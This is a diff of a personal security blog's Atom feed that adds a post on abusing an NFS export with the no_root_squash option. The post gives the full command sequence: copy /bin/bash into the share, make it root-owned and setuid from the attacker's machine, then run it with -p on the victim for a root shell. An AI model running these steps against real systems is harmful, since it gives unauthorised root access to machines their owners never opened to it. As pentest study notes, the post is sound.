@@ -4,13 +4,51 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-01-24T19:28:34+08:00</updated>
+ <updated>2022-01-29T18:51:30+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>NFS no_root_squash</title>
+   <link href="https://mvineza.github.io/spindel/2022/01/29/nfs-no-root-squash"/>
+   <updated>2022-01-29T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/01/29/NFS-no_root_squash</id>
+   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;If an NFS export contains &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;no_root_squash&lt;/code&gt; option, attacker can mount that export on his machine and modify any file acting as root user.&lt;/p&gt;
+
+&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Mount share on attacker machine&lt;/li&gt;
+  &lt;li&gt;Inside victim machine, copy &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# e.g /home/james is an NFS export&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/james
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /bin/bash &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;From attacker machine&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /mnt
+&lt;span class=&quot;nb&quot;&gt;sudo chown &lt;/span&gt;root:root bash
+&lt;span class=&quot;nb&quot;&gt;sudo chmod &lt;/span&gt;u+s bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Back to victim machine,&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# enjoy!&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Zipped LNK files over SMB</title>
